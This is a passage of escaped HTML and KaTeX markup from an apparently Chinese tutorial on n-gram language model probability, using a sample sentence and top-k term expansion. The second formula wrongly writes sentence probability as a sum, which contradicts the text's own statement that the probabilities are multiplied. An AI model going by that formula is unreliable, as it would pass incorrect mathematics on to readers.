mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;/msub&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;p(s) = p(w_1, w_2, ..., w_T) = p(w_1)p(w_2|w_1)p(w_3|w_1,w_2)...p(w_t|w_1,w_2,...,w_(T-1))
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.1052em;vertical-align:-0.3551999999999999em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;∣&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;∣&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;∣&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.34480000000000005em;&#34;&gt;&lt;span style=&#34;top:-2.5198em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mopen mtight&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.3551999999999999em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;这个概率公式的意义为：第一次词确认后，看后面的词在前面词出现的情况下出现的概率。&lt;/p&gt;
&lt;p&gt;例如，句子 &lt;strong&gt;燕子没有你我可怎么活啊&lt;/strong&gt;，分词后 &lt;strong&gt;燕子 没有你 我可 怎么活&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;那么这整句话出现的概率：p(燕子，没有你，我可，怎么活) = p(燕子)p(没有你|燕子)p(我可|燕子，没有你)p(怎么活|燕子，没有你，我可)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;p(燕子)表示&lt;strong&gt;燕子&lt;/strong&gt;这个词在语料库中出现的概率；&lt;/li&gt;
&lt;li&gt;p(没有你|燕子)表示在&lt;strong&gt;燕子&lt;/strong&gt;后出现&lt;strong&gt;没有你&lt;/strong&gt;的概率；&lt;/li&gt;
&lt;li&gt;以此类推...&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;把这些概率一次相乘就是整句话出现的概率，然后按照用户输入的词条，取出语料库中概率的topk个词条就可以实现扩展词条的功能。&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;munderover&gt;&lt;mo&gt;∑&lt;/mo&gt;&lt;mrow&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;/munderover&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;w&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;∣&lt;/mi&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;p(s) = p(w_1,w_2,...,w_T) = \sum_{i=1}^{T}p(w_i|Context_i)
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02691em;&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span 